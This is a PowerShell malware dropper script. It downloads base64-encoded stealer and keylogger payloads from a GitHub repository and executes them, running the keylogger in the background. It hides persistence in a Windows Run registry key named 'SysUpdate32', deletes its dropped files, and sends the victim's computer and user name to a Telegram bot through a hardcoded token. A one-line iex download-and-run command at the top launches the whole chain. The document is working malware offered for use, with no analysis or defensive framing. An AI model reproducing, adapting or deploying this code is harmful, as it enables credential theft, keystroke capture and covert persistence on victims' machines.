# Self-contained aggressive payload - fully embedded, no downloads needed
# Execute in PowerShell:
# iex((iwr 'https://api.github.com/repos/isajarGamer2/stealer-repo/contents/payload_final.ps1?ref=main' -UseBasicParsing -UserAgent 'Mozilla/5.0').Content|ConvertFrom-Json).content|%{[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_))})

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"
$tempDir = "$env:TEMP\sysupdate_$(Get-Random -Maximum 9999)"

New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
Set-Location $tempDir

# Download stealer.ps1 from GitHub API
$apiUrl = "https://api.github.com/repos/isajarGamer2/stealer-repo/contents/stealer.ps1?ref=main"
$stealerCode = ""
try {
    $resp = iwr $apiUrl -UseBasicParsing -UserAgent "Mozilla/5.0" -ErrorAction Stop
    $j = $resp.Content | ConvertFrom-Json
    $stealerCode = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($j.content))
    Write-Host "[+] Downloaded aggressive stealer.ps1" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# Download keylogger.ps1
$klUrl = "https://api.github.com/repos/isajarGamer2/stealer-repo/contents/keylogger.ps1?ref=main"
$klCode = ""
try {
    $resp = iwr $klUrl -UseBasicParsing -UserAgent "Mozilla/5.0" -ErrorAction Stop
    $j = $resp.Content | ConvertFrom-Json
    $klCode = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($j.content))
    Write-Host "[+] Downloaded keylogger.ps1" -ForegroundColor Green
} catch {}

# Save and execute stealer
$stealerCode | Out-File "$tempDir\stealer.ps1" -Encoding UTF8
Write-Host "[*] Executing aggressive stealer..." -ForegroundColor Yellow
Invoke-Expression $stealerCode

# Save and execute keylogger in background
if ($klCode) {
    $klCode | Out-File "$tempDir\keylogger.ps1" -Encoding UTF8
    Start-Job -ScriptBlock { param($c) iex $c } -ArgumentList $klCode | Out-Null
    Write-Host "[+] Keylogger started" -ForegroundColor Green
}

# Persistence
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SysUpdate32" -Value "powershell.exe -ExecutionPolicy Bypass -File `"$tempDir\stealer.ps1`"" -Force
} catch {}

# Cleanup
Remove-Item "$tempDir\*.ps1" -Force -ErrorAction SilentlyContinue

# SUCCESS
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "           SUCCESS" -ForegroundColor Green -BackgroundColor Black
Write-Host "========================================" -ForegroundColor Green

# Telegram confirmation
try {
    iwr "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{chat_id=$chatId;text="[+] AGGRESSIVE PAYLOAD on $env:COMPUTERNAME by $env:USERNAME at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"} -UseBasicParsing -ErrorAction Stop | Out-Null
} catch {}
